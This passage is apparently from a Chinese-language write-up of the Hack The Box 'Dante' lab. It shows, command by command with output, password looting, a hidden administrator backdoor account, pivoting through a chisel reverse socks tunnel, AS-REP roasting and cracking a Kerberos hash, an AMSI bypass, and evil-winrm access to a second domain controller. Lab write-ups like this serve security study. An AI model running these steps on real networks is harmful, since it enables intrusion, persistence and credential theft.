Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="nt">-----</span>
          

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>
<p>成功获取到 SYSTEM shell。</p>

<p>查看 Users 目录下的用户：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12/25/2023  03:08 AM    &lt;DIR&gt;          katwamba
01/08/2021  12:26 PM    &lt;DIR&gt;          MediaAdmin<span class="err">$</span>
08/22/2013  03:39 PM    &lt;DIR&gt;          Public
06/10/2020  11:23 AM    &lt;DIR&gt;          <span class="nb">test
</span>07/19/2022  04:33 PM    &lt;DIR&gt;          xadmin
</code></pre></div></div>
<ul>
  <li>katwamba</li>
  <li>test</li>
  <li>xadmin</li>
</ul>

<p>在 <code class="language-plaintext highlighter-rouge">katwamba\Desktop</code> 目录下找到 flag.txt。该目录下还有一个 employee_backup.xlsx 文件，下载回来。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> download <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\k</span><span class="s2">atwamba</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\e</span><span class="s2">mployee_backup.xlsx"</span> /project/HTB/ProLab/Dante
</code></pre></div></div>
<p>文件中包含了很多用户名密码。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
</code></pre></div></div>

<h2 id="用户-comment-信息泄露">用户 Comment 信息泄露</h2>
<p>net users 查看用户时发现存在一个 mrb3n 用户，进一步查看该用户的信息时，可以在 Comment 中发现密码和 flag。</p>
<ul>
  <li>mrb3n/S3kur1ty2020!</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user mrb3n
net user mrb3n
User name                    mrb3n
Full Name                    mrb3n
Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE<span class="o">{</span>1_jusT_c@nt_st0p_d0ing_th1s<span class="o">}</span>
User<span class="s1">'s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2020 3:43:25 PM
Password expires             1/27/2021 3:43:25 PM
Password changeable          7/31/2020 3:43:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
</span></code></pre></div></div>

<h2 id="域内信息收集有凭证">域内信息收集（有凭证）</h2>
<p>有了域用户 mrb3n/S3kur1ty2020! 后，可以使用 bloodhound 收集域内信息。</p>

<p>bloodhound-python 相比 SharpHound 的优势在于不需要在域内机器中落地，但需要注意的是，UDP 请求无法经过 socks 代理，但 –dns-tcp 参数可以将 dns 请求以 TCP 的方式发送，这样就可以避免 bloodhound-python 无法解析到域名。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> bloodhound-python <span class="nt">--zip</span> <span class="nt">-c</span> All <span class="nt">-d</span> DANTE.local <span class="nt">-u</span> mrb3n <span class="nt">-p</span> <span class="s1">'S3kur1ty2020!'</span> <span class="nt">-dc</span> DANTE-DC01.DANTE.local <span class="nt">-ns</span> 172.16.1.20 <span class="nt">--dns-tcp</span>
</code></pre></div></div>

<p>但目标返回无法认证成功，难道是密码不对的缘故？</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INFO: Found AD domain: dante.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dante.local:88<span class="o">)]</span> <span class="o">[</span>Errno 111] Connection refused
INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local
ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/home/kali/.local/bin//bloodhound-python"</span>, line 8, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>main<span class="o">())</span>
             ^^^^^^
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py"</span>, line 338, <span class="k">in </span>main
    bloodhound.run<span class="o">(</span><span class="nv">collect</span><span class="o">=</span>collect,
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py"</span>, line 79, <span class="k">in </span>run
    self.pdc.prefetch_info<span class="o">(</span><span class="s1">'objectprops'</span> <span class="k">in </span>collect, <span class="s1">'acl'</span> <span class="k">in </span>collect, <span class="nv">cache_computers</span><span class="o">=</span>do_computer_enum<span class="o">)</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 523, <span class="k">in </span>prefetch_info
    self.get_objecttype<span class="o">()</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 240, <span class="k">in </span>get_objecttype
    self.ldap_connect<span class="o">()</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 69, <span class="k">in </span>ldap_connect
    ldap <span class="o">=</span> self.ad.auth.getLDAPConnection<span class="o">(</span><span class="nb">hostname</span><span class="o">=</span>self.hostname, <span class="nv">ip</span><span class="o">=</span>ip,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py"</span>, line 119, <span class="k">in </span>getLDAPConnection
    raise CollectionException<span class="o">(</span><span class="s1">'Could not authenticate to LDAP. Check your credentials and LDAP server requirements.'</span><span class="o">)</span>
bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
</code></pre></div></div>

<h2 id="添加后门用户">添加后门用户</h2>
<p>使用 meterpreter 添加后门用户，注意密码要符合密码策略。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run post/windows/manage/enable_rdp <span class="nv">username</span><span class="o">=</span><span class="s2">"dummykitty"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"!QAZ2wsx#EDC"</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enabling Remote Desktop
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     RDP is already enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting Terminal Services service startup mode
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Terminal Services service is already <span class="nb">set </span>to auto
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Opening port <span class="k">in </span><span class="nb">local </span>firewall <span class="k">if </span>necessary
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting user account <span class="k">for </span>logon
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty with Password: <span class="o">!</span>QAZ2wsx#EDC
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty to <span class="nb">local </span>group <span class="s1">'Remote Desktop Users'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Hiding user from Windows Login screen
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty to <span class="nb">local </span>group <span class="s1">'Administrators'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> You can now login with the created user
</code></pre></div></div>
<p>或者手动在 shell 中执行。</p>
<pre><code class="language-bash　　　　">net user dummykitty !QAZ2wsx#EDC /add
net localgroup administrators dummykitty /add   
</code></pre>
<p>如果目标机器没有开启远程桌面服务，修改注册表。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal<span class="s2">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
</code></pre></div></div>

<p>添加完后不知道为什么都无法正常登陆。</p>

<h2 id="主机存活性扫描">主机存活性扫描</h2>
<p>常规的一些网络发现命令如下，但都没有发现其他网段。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w"> </span><span class="c">#Info about interfaces</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w"> </span><span class="c">#Print available routes</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="c">#Know hosts</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="c">#Opened ports?</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">C:\WINDOWS\System32\drivers\etc\hosts</span><span class="w">
</span><span class="nx">ipconfig</span><span class="w"> </span><span class="nx">/displaydns</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Record"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Name Host"</span><span class="w">
</span></code></pre></div></div>

<p>在 DC01 中扫描 172.16.2.0/24 网段，可以发现存活主机 172.16.2.5</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">
</span><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.5:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">127</span><span class="w">
</span></code></pre></div></div>

<h1 id="windows-1721625-dante-dc02">Windows: 172.16.2.5 (DANTE-DC02)</h1>
<h2 id="端口扫描">端口扫描</h2>
<p>172.16.2.5 主机只有 172.16.1.20 可以访问。msf 可以借助 172.16.1.20 中的 session 自动添加路由，然后对 172.16.2.5 进行端口扫描。</p>

<p>在 172.16.1.20 的 session 中执行 autoroute</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run autoroute <span class="nt">-s</span> 172.16.2.0/24
</code></pre></div></div>
<p>然后使用 auxiliary/scanner/portscan/tcp 进行端口扫描。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/portscan/tcp
msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 172.16.2.5
RHOSTS <span class="o">=&gt;</span> 172.16.2.5
msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>THREADS 10
THREADS <span class="o">=&gt;</span> 10
msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> run
</code></pre></div></div>
<p>端口开放情况如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:53 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:88 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:139 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:135 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:389 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:445 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:464 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:593 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:636 - TCP OPEN
</code></pre></div></div>
<p>目标开放了 88 端口，很有可能是另外一台 DC。</p>
<h2 id="搭建代理-chiselmsf">搭建代理: chisel/msf</h2>
<p>也可以上传 chisel.exe，开启一个新的 socks 代理，reverse 模式下，server 部署在本地，远程可以直接连接到此前运行的服务端。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start /b ch.exe client 10.10.14.5:12345 R:0.0.0.0:1088:socks
</code></pre></div></div>
<p>使用 fscan 扫描</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.2.0/24 <span class="nt">-socks5</span> 127.0.0.1:1088 <span class="nt">-p</span> <span class="s2">"1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,88,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535"</span> <span class="nt">-o</span> 172.16.2.5_fscan_result.txt

   ___                              _    
  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___| | __ 
 / /_<span class="se">\/</span>____/ __|/ __| <span class="s1">'__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
Socks5Proxy: socks5://127.0.0.1:1088
start infoscan
172.16.2.5:53 open
172.16.2.5:88 open
172.16.2.5:135 open
172.16.2.5:139 open
172.16.2.5:389 open
172.16.2.5:445 open
172.16.2.5:5985 open
172.16.2.5:47001 open
[*] alive ports len is: 8
start vulscan
[*] NetInfo:
[*]172.16.2.5
   [-&gt;]DANTE-DC02
   [-&gt;]172.16.2.5
[*] WebTitle: http://172.16.2.5:47001   code:404 len:315    title:Not Found
[*] WebTitle: http://172.16.2.5:5985    code:404 len:315    title:Not Found
已完成 8/8
[*] 扫描结束,耗时: 8m38.713472155s

</span></code></pre></div></div>
<p>fscan 扫描出了 172.16.2.5 机器名为 DANTE-DC02，且开放了 5985 端口。</p>

<p>搭建代理也可以直接使用 msf</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/server/socks_proxy
<span class="nb">set </span>SRVPORT 1082
run
</code></pre></div></div>
<h2 id="通过-smb-匿名枚举用户名">通过 SMB 匿名枚举用户名</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> ./proxychains_1088.conf crackmapexec smb 172.16.2.5 <span class="nt">--users</span>

SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DANTE-DC02<span class="o">)</span> <span class="o">(</span>domain:DANTE.ADMIN<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span>-] Error enumerating domain <span class="nb">users </span>using dc ip 172.16.2.5: NTLM needs domain<span class="se">\u</span>sername and a password
SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying with SAMRPC protocol
</code></pre></div></div>

<p>cme 获取到了域名 DANTE.ADMIN</p>

<h2 id="通过-kerbrute-枚举用户名">通过 Kerbrute 枚举用户名</h2>
<p>通过 socks5 代理 kerbrute 进行扫描。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> ./proxychains_1088.conf kerbrute userenum <span class="nt">-d</span> dante <span class="nt">--dc</span> 172.16.2.5 users.txt
</code></pre></div></div>
<p>users.txt 中包含了 DANTE.local 域中的用户名：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley
julian
ben
balthazar
mrb3n
</code></pre></div></div>
<p>目标环境可能存在一些问题，扫描时经常会出现：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Root cause: Encoding_Error] Encoding_Error: failed to unmarshal KDC<span class="s1">'s reply: asn1: syntax error: sequence truncated                                   
</span></code></pre></div></div>
<p>查看其他 writeup 才知道存在 jbercov@dante 用户。</p>
<h2 id="asreproast">ASREProast</h2>
<p>针对没有启用 Kerberos 预身份验证的用户，可以使用 ASREProast 获取用户的 TGT，此过程不需要具备域账户，只需要与 KDC 建立连接即可进行攻击。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-f</span> proxychains_1088.conf GetNPUsers.py dante/jbercov <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 172.16.2.5 <span class="nt">-outputfile</span> kerberoasting.hashes

<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:1088  ...  172.16.2.5:88  ...  OK
<span class="nv">$krb5asrep$23$jbercov</span>@DANTE:ddb1e0b115be8c818771b834539efef3<span class="nv">$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07</span>
</code></pre></div></div>
<h2 id="johnhashcat-破解-krb5asrep">john/hashcat 破解 krb5asrep</h2>
<p>得到 hash 之后可以通过 hashcat 或者 john 进行破解。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 18200 <span class="nt">--force</span> <span class="nt">-a</span> 0 kerberoasting.hashes /webtools/dicts/rockyou.txt
</code></pre></div></div>
<p>成功爆破出密码：myspace7</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07:myspace7
</code></pre></div></div>

<p>使用 john 进行破解。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john kerberoasting.hashes <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
myspace7         <span class="o">(</span><span class="nv">$krb5asrep$23$jbercov</span>@DANTE<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-12-29 04:14<span class="o">)</span> 4.000g/s 57344p/s 57344c/s 57344C/s havana..cherry13
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<p>jbercov/myspace7</p>

<p>获取到用户名密码之后，目标开启了 5985 端口，因此可以使用 evil-winrm 连接。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf evil-winrm <span class="nt">-i</span> 172.16.2.5 <span class="nt">-u</span>  jbercov <span class="nt">-p</span> myspace7 <span class="nt">-s</span> /webtools/movement/PowerSharpPack/PowerSharpBinaries
</code></pre></div></div>
<p>在用户 Desktop 目录可以找到 flag.txt</p>

<h2 id="提权-dacl-滥用导致-dcsync">提权: DACL 滥用导致 DCSync</h2>
<p>借助 evil-winrm，我们可以直接加载 winPEASE，将执行结果保存在文件中，然后将结果文件下载回来，但 winPEAS 结果中并没有太多有用的信息。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS <span class="o">&gt;&gt;</span> .out
</code></pre></div></div>
<p>在拥有凭证的情况下，我们可以使用 bloodhound 来获取更多信息。bloodhound-python 可以使用如下的命令，但会出现 DNS 服务器无法解析的问题。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1082.conf bloodhound-python <span class="nt">--zip</span> <span class="nt">-c</span> All <span class="nt">-d</span> dante <span class="nt">-u</span> jbercov <span class="nt">-p</span> myspace7 <span class="nt">-dc</span> 172.16.2.5 <span class="nt">-ns</span> 172.16.2.5 <span class="nt">--dns-tcp</span>
</code></pre></div></div>

<p>执行 PowerSharpPack 中的 Invoke-SharpHound4 会出现报错。</p>

<p>考虑直接上传 SharpHound.exe 然后执行 <code class="language-plaintext highlighter-rouge">-c all</code></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\sh.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.7826199</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">This</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">compatible</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">4.3.1</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">BloodHound</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.8920174</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.9089993</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">14:03</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">29/12/2023</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.0013614</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="p">[</span><span class="n">CommonLib</span><span class="w"> </span><span class="n">LDAPUtils</span><span class="p">]</span><span class="n">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">DANTE.ADMIN</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">DANTE-DC02.DANTE.ADMIN</span><span class="w">
